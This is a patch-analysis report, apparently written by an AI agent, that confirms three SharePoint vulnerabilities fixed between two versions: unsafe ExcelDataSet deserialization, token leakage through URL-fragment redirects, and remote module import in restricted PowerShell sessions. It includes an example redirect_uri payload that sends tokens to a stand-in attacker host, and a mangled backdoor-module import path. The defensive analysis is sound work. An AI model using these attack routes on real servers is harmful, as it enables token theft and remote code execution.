Agent: Codex (GPT-5)
Timestamp: $(date -u '+%Y-%m-%d %H:%M:%S UTC')
Duration: N/A

# Verified Vulnerabilities

## 1. ExcelDataSet Safe-Control Hardening
**Diff evidence** – `diff_reports/v1-to-v2.server-side.patch` (`C__Program Files_Common Files_Microsoft Shared_Web Server Extensions/16/CONFIG/web.config`, SafeControls block):
```
+      <SafeControl Assembly="Microsoft.PerformancePoint.Scorecards.Client, Version=15.0.0.0, ..." Namespace="Microsoft.PerformancePoint.Scorecards" TypeName="ExcelDataSet" Safe="False" ... />
+      <SafeControl Assembly="Microsoft.PerformancePoint.Scorecards.Client, Version=16.0.0.0, ..." Namespace="Microsoft.PerformancePoint.Scorecards" TypeName="ExcelDataSet" Safe="False" ... />
```
(Same additions appear in the farm-level and per-web `web.config` files.)

**V1 vulnerable behavior**
- `snapshots_norm/v1/C__inetpub_wwwroot_wss_VirtualDirectories/80/web.config:240-245` lists `Microsoft.PerformancePoint.Scorecards.Client` with `TypeName="*"`, so any class in that namespace is treated as safe and can be instantiated inside page markup by site authors.
- `snapshots_decompiled/v1/Microsoft.-89ead232-72556f65/Microsoft/PerformancePoint/Scorecards/ExcelDataSet.cs:40-78` exposes the `[XmlElement] public string CompressedDataTable` property; setting it assigns attacker-controlled Base64 data to `compressedDataTable`. When `DataTable` is read, it executes:
  ```csharp
  dataTable = Helper.GetObjectFromCompressedBase64String(compressedDataTable, ExpectedSerializationTypes) as DataTable;
  ```
- `snapshots_decompiled/v1/.../Helper.cs:556-599` shows `GetObjectFromCompressedBase64String` decompresses the payload and calls `BinarySerialization.Deserialize` with no type restrictions:
  ```csharp
  GZipStream gZipStream = new GZipStream(memoryStream, CompressionMode.Decompress);
  return BinarySerialization.Deserialize((Stream)gZipStream, (XmlValidator)null, (IEnumerable<Type>)null);
  ```
- Because SafeControls permitted arbitrary instantiation, any user who can edit a page could drop an `<SharePoint:...>` element referencing `ExcelDataSet`, feed a malicious `CompressedDataTable`, and run an arbitrary BinaryFormatter gadget chain under the SharePoint worker process (RCE / C/I/A impact). There are no validation or allow-list checks.

**V2 mitigation**
- The patch injects explicit `<SafeControl ... TypeName="ExcelDataSet" Safe="False" ... />` entries for both the 15.0 and 16.0 client assemblies in every relevant `web.config` (farm-wide and virtual directories), e.g. `snapshots_norm/v2/C__inetpub_wwwroot_wss_VirtualDirectories/80/web.config:488-494`. Because SafeControls entries are evaluated in order, the `Safe="False"` directive overrides the earlier wildcard and blocks the control from being loaded in user markup, cutting off the deserialization entry point.

**Confidence: High** – The vulnerable code path (BinaryFormatter deserialization of attacker data) and the configuration change that removes the instantiation surface are directly visible.

## 2. ProofTokenSignInPage Allowed Fragment Redirects
**Diff evidence** – `diff_reports/v1-to-v2.server-side.patch` (`ProofTokenSignInPage.ShouldRedirectWithProofToken`):
```
@@ -318,6 +320,11 @@ protected bool ShouldRedirectWithProofToken()
 	if (null != RedirectUri)
 	{
 		result = IsAllowedRedirectUrl(RedirectUri);
+		if ((!((SPPersistedObject)(object)SPFarm.Local != (SPPersistedObject)null) || !SPFarm.Local.ServerDebugFlags.Contains(53020)) && !string.IsNullOrEmpty(RedirectUri.Fragment))
+		{
+			ULS.SendTraceTag(..., "[ProofTokenSignInPage] Hash parameter is not allowed.");
+			result = false;
+		}
 	}
```

**V1 vulnerable behavior**
- `RedirectUri` is populated straight from `redirect_uri` query string (`snapshots_decompiled/v1/.../ProofTokenSignInPage.cs:40-68`). No fragment check occurs.
- `ShouldRedirectWithProofToken` only called `IsAllowedRedirectUrl` (`snapshots_decompiled/v1/...:315-325`), which validates the host/tenant but ignores fragments.
- `SignInAppWeb` redirects users back to `RedirectUri.OriginalString` after minting proof & identity tokens (`snapshots_decompiled/v1/...:475-498`). Thus any fragment appended to the URL is returned verbatim to the browser.
- `AppRedirectPage` (target of `redirect_uri`) explicitly tolerates fragment patterns like `#@example.com` (regex `#[^\/]*@` in `snapshots_decompiled/v1/Microsoft.-15e938a4-fc4de2db/Microsoft/SharePoint/ApplicationPages/AppRedirectPage.cs:430-448`) and still builds a valid `Uri`. Later checks only ensure the **pre-fragment** authority belongs to the tenant; if so, the page posts the tokens to the URL. Browsers then interpret the fragment and perform a client-side redirect to the attacker’s domain (`#@https://evil.example`). Therefore, an attacker can supply `redirect_uri=/.../AppRedirect.aspx#@https://evil.example` and receive valid proof/identity tokens exfiltrated via the fragment.

**V2 mitigation**
- The new logic in `ShouldRedirectWithProofToken` rejects any `RedirectUri` with a fragment unless an administrator explicitly toggles server debug flag 53020. This ensures proofs are only ever sent to URLs without fragments, eliminating the ability to smuggle a second-stage destination through `#@`.

**Confidence: High** – The fragment acceptance is obvious in v1, and the patch directly targets URIs containing fragments.

## 3. Show-Command Remote Module Import in Restricted Sessions
**Diff evidence** – `diff_reports/v1-to-v2.server-side.patch` (`ShowCommandCommand.WaitForWindowClosedOrHelpNeeded`):
```
@@ -399,6 +399,12 @@ private void WaitForWindowClosedOrHelpNeeded()
 		case 0:
 			return;
 		}
+		string path = FileSystemProvider.NormalizePath(base.SessionState.Path.GetUnresolvedProviderPathFromPSPath(showCommandProxy.ParentModuleNeedingImportModule));
+		if (Utils.IsSessionRestricted(base.Context) && (FileSystemProvider.NativeMethods.PathIsNetworkPath(path) || Utils.PathIsDevicePath(path)))
+		{
+			ErrorRecord errorRecord = new ErrorRecord(new ArgumentException(HelpErrors.NoNetworkCommands, "Name"), "CommandNameNotAllowed", ErrorCategory.InvalidArgument, null);
+			ThrowTerminatingError(errorRecord);
+		}
 		string importModuleCommand = showCommandProxy.GetImportModuleCommand(showCommandProxy.ParentModuleNeedingImportModule);
 		Collection<PSObject> collection;
```

**V1 vulnerable behavior**
- The GUI helper exposes `ParentModuleNeedingImportModule` (`snapshots_decompiled/v1/Microsoft.-056c3798-daa17c9d/Microsoft/PowerShell/Commands/ShowCommandProxy.cs:13-34`). It originates from the graphical host’s metadata and can refer to any module path that Windows PowerShell discovers (including UNC shares).
- In `ShowCommandCommand.WaitForWindowClosedOrHelpNeeded` (v1 snippet at `snapshots_decompiled/v1/.../ShowCommandCommand.cs:387-414`), once the UI requests an import, the cmdlet blindly runs `InvokeScript(importModuleCommand)` without considering the path source. In constrained sessions (PowerShell Web Access, Application Guard, etc.), policy is supposed to block importing from remote locations, but this path bypasses it because the GUI builds `Import-Module \attacker	oolsackdoor.psm1` and PowerShell executes it as soon as the UI asks for missing commands.
- There is no check for `Utils.IsSessionRestricted`, no UNC/device filtering, and the call runs under full user credentials. An attacker who controls module discovery (or convinces the user to input a module from a share) achieves code execution even though the session is meant to forbid remote scripts.

**V2 mitigation**
- Before constructing the import command, v2 normalizes the provider path and, if `Utils.IsSessionRestricted(base.Context)` holds, rejects any UNC (`PathIsNetworkPath`) or device path (`Utils.PathIsDevicePath`) by throwing `CommandNameNotAllowed`. That prevents remote or device-based modules from being imported in restricted sessions; the import never occurs.

**Confidence: High** – The missing restriction is evident in v1 and the patch explicitly adds the necessary checks.

# Coverage of Other Security-Relevant Changes
Scanned `diff_reports/v1-to-v2.server-side.stat.txt` and searched the patch for keywords such as `SafeControl`, `KillSwitch`, `Validate`, `Authentication`, and `Restricted`. The only clear security-focused hunks are the three groups verified above (plus their supporting upgrade helpers for `AddExcelDataSetToSafeControls`, which are part of vulnerability #1). No additional validation/authentication/permission changes were identified elsewhere in the diff set. Therefore there are no unmapped security-looking changes to report.

# Final Assessment
- ExcelDataSet Safe-Control Hardening – **Confirmed**
- ProofTokenSignInPage Fragment Filtering – **Confirmed**
- Show-Command Restricted Import Guard – **Confirmed**

Each claim is directly supported by the code and diffs shown above; no contradictions were found.
